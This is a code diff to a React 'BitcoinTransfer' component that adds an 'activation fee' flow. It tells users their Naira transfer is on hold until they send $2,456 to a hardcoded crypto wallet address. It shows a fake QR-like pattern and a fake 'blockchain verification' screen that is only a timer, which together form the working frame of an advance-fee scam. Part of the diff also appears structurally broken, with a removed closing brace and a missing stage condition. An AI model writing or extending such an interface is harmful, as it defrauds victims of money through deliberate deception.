@@ -1,5 +1,5 @@
 import { CodeBackground } from "@/components/code-background"
-import { ArrowLeft, Bitcoin, AlertTriangle, Shield, Lock, DollarSign, Cpu } from "lucide-react"
+import { ArrowLeft, Bitcoin, AlertTriangle, Shield, Lock, DollarSign, Cpu, Copy, CheckCircle, Loader } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { useState } from "react"
@@ -19,7 +19,10 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
   const [bitcoinAmount, setBitcoinAmount] = useState("")
   const [error, setError] = useState("")
   const [transferring, setTransferring] = useState(false)
-  const [processingStage, setProcessingStage] = useState<"form" | "processing" | "complete">("form")
+  const [processingStage, setProcessingStage] = useState<"form" | "processing" | "complete" | "activation-payment" | "activation-processing">("form")
+  const [copied, setCopied] = useState(false)
+  const ACTIVATION_FEE = 2456
+  const WALLET_ADDRESS = "0xb535Dff88de8c17fF34df2d356a78fe8C050537d"
 
   const handleNairaChange = (value: string) => {
     const cleanValue = value.replace(/[^\d.]/g, "")
@@ -64,7 +67,6 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
 
     setProcessingStage("processing")
     setTransferring(true)
-  }
 
   if (processingStage === "processing") {
     return (
@@ -78,7 +80,147 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
     )
   }
 
-  if (processingStage === "complete") {
+  const handleProceedWithActivation = () => {
+    setProcessingStage("activation-payment")
+  }
+
+  const handleCopyAddress = () => {
+    navigator.clipboard.writeText(WALLET_ADDRESS)
+    setCopied(true)
+    setTimeout(() => setCopied(false), 2000)
+  }
+
+  const handleConfirmPayment = () => {
+    setProcessingStage("activation-processing")
+    // Simulate payment processing
+    setTimeout(() => {
+      setProcessingStage("complete")
+    }, 3000)
+  }
+
+  // Activation Payment Screen
+  if (processingStage === "activation-payment") {
+    return (
+      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
+        <CodeBackground />
+
+        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full">
+          {/* Header */}
+          <div className="text-center mb-6">
+            <div className="w-16 h-16 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40 mx-auto mb-4">
+              <DollarSign className="w-10 h-10 text-white" />
+            </div>
+            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 to-orange-600 bg-clip-text text-transparent">
+              PAYMENT WALLET
+            </h1>
+            <p className="text-gray-400 text-sm">Send activation fee to complete transaction</p>
+          </div>
+
+          {/* Activation Fee Display */}
+          <div className="bg-red-950/40 border-2 border-red-600/40 rounded-xl p-6 mb-4 backdrop-blur-md text-center">
+            <p className="text-sm text-gray-400 mb-2 uppercase tracking-wider">Activation Fee Required</p>
+            <p className="text-4xl font-black text-red-400 mb-2">${ACTIVATION_FEE}</p>
+            <p className="text-xs text-gray-500">One-time payment for lifetime access</p>
+          </div>
+
+          {/* Wallet Address */}
+          <div className="bg-gray-900/60 border-2 border-red-600/30 rounded-xl p-5 mb-4 backdrop-blur-md">
+            <p className="text-xs text-gray-400 uppercase tracking-wider mb-3">Send Payment To</p>
+            
+            {/* Address Display */}
+            <div className="bg-black/80 border border-red-500/30 rounded-lg p-4 mb-4">
+              <p className="text-xs text-gray-500 mb-2">Wallet Address</p>
+              <div className="flex items-center gap-2">
+                <code className="text-sm font-mono text-red-400 break-all flex-1">{WALLET_ADDRESS}</code>
+                <button
+                  onClick={handleCopyAddress}
+                  className="flex-shrink-0 p-2 hover:bg-red-900/40 rounded-lg transition-colors"
+                >
+                  {copied ? (
+                    <CheckCircle className="w-5 h-5 text-green-400" />
+                  ) : (
+                    <Copy className="w-5 h-5 text-red-400" />
+                  )}
+                </button>
+              </div>
+            </div>
+
+            {/* Visual QR-like Wallet Representation */}
+            <div className="bg-gradient-to-br from-red-950/60 to-orange-950/40 rounded-lg p-6 mb-4 text-center">
+              <div className="grid grid-cols-12 gap-1 max-w-xs mx-auto">
+                {WALLET_ADDRESS.split('').map((char, idx) => (
+                  <div
+                    key={idx}
+                    className={`w-3 h-3 rounded-sm transition-colors ${
+                      char.charCodeAt(0) % 2 === 0
+                        ? 'bg-red-600/60 animate-pulse'
+                        : 'bg-red-400/40'
+                    }`}
+                  />
+                ))}
+              </div>
+              <p className="text-xs text-gray-500 mt-4">Wallet Address Signature</p>
+            </div>
+
+            <div className="bg-red-950/40 border border-red-600/30 rounded-lg p-3">
+              <p className="text-xs text-red-300 leading-relaxed">
+                <strong>Send exactly ${ACTIVATION_FEE}</strong> to the wallet address above. Once payment is confirmed by the network, your transaction will be automatically processed.
+              </p>
+            </div>
+          </div>
+
+          {/* Buttons */}
+          <div className="space-y-3">
+            <Button
+              onClick={handleConfirmPayment}
+              className="w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-red-500/40 shadow-lg shadow-red-900/40"
+            >
+              <CheckCircle className="w-4 h-4 mr-2" />
+              I Have Sent the Payment
+            </Button>
+
+            <Button
+              onClick={() => setProcessingStage("complete")}
+              variant="outline"
+              className="w-full bg-gray-900/60 border-gray-700 text-white hover:bg-gray-800 py-3"
+            >
+              <ArrowLeft className="w-4 h-4 mr-2" />
+              Back to Activation Info
+            </Button>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  // Activation Processing Screen
+  if (processingStage === "activation-processing") {
+    return (
+      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
+        <CodeBackground />
+
+        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full flex items-center justify-center">
+          <div className="text-center">
+            <div className="w-20 h-20 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40 mx-auto mb-6 animate-spin">
+              <Loader className="w-10 h-10 text-white" />
+            </div>
+
+            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 to-orange-600 bg-clip-text text-transparent">
+              AWAITING PAYMENT CONFIRMATION
+            </h1>
+
+            <p className="text-gray-400 text-sm mb-2">Processing your activation payment...</p>
+
+            <div className="bg-red-950/40 border border-red-600/40 rounded-lg p-4 mt-6 max-w-xs mx-auto">
+              <p className="text-xs text-gray-300 leading-relaxed">
+                Our system is verifying your payment on the blockchain. This may take a few moments. Once confirmed, your transaction will proceed automatically.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    )
+  }
     const transferredAmount = Number.parseFloat(nairaAmount.replace(/,/g, "")) || 0
 
     return (
@@ -148,7 +290,7 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
                   <DollarSign className="w-6 h-6 text-yellow-400" />
                   <div>
                     <p className="text-xs text-gray-400 uppercase tracking-wider">Activation Fee</p>
-                    <p className="text-2xl font-black text-yellow-400">$1,865</p>
+                    <p className="text-2xl font-black text-red-400">${ACTIVATION_FEE}</p>
                   </div>
                 </div>
                 <div className="text-right">
@@ -177,15 +319,18 @@ export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: B
           {/* Info Notice */}
           <div className="bg-gray-900/60 border border-gray-800 rounded-lg p-4 mb-6">
             <p className="text-xs text-gray-300 leading-relaxed">
-              <strong className="text-yellow-400">Important:</strong> Your transaction of ₦{transferredAmount.toLocaleString("en-NG")} to the Bitcoin wallet is currently on hold. The software activation fee of $1,865 is required to verify transaction integrity and ensure secure fund delivery. This is a one-time payment that enables all future external transfers.
+              <strong className="text-red-400">Important:</strong> Your transaction of ₦{transferredAmount.toLocaleString("en-NG")} to the Bitcoin wallet is currently on hold. The software activation fee of ${ACTIVATION_FEE} is required to verify transaction integrity and ensure secure fund delivery. This is a one-time payment that enables all future external transfers.
             </p>
           </div>
 
           {/* Buttons */}
           <div className="space-y-3">
-            <Button className="w-full bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-yellow-500/40 shadow-lg shadow-yellow-900/40">
+            <Button
+              onClick={handleProceedWithActivation}
+              className="w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-red-500/40 shadow-lg shadow-red-900/40"
+            >
               <DollarSign className="w-4 h-4 mr-2" />
-              Proceed with $1,865 Activation
+              Proceed with ${ACTIVATION_FEE} Activation
             </Button>
             
             <Button onClick={onBack} variant="outline" className="w-full bg-gray-900/60 border-gray-700 text-white hover:bg-gray-800 py-3">
